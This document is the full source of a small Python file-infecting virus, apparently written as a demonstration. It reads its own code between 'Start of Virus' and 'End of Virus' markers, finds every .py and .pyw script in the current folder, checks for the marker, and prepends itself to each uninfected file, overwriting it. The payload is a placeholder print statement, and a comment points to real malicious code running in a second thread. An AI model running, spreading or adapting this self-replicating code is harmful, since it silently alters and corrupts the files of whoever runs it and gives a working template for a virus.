### Start of Virus ###

import sys, glob

# Finding the code of the current file ###
code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

# Finding the code of Virus area"
virus_area = False  # Because We are not in the virus area
for line in lines:
    if line == '### Start of Virus ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### End of Virus ###\n':
        break

# Finding python scripts  by extensions ('.pyw' is the extension for python scripts that run without a visible window)
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

# Go through all the scripts  and check if infected , if not then inject the  virus code area
for script in python_scripts:
    with open(script, 'r') as f: # 'r' = reading mode
        script_code =f.readlines()

    # Assuming that the file is not infected.
    infected = False
    for line in script_code:
        if line == '### Start of Virus ###\n':
            infected = True
            break
    # If not infected then  add the virus code into final_code into the file.
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        # Override everything  with the final_code
        with open(script, 'w') as f:
            f.writelines(final_code)

# Malicious Piece of code (run this in 2nd threat) to not block the original file functionality
print("Malicious Code")
### End of Virus ###
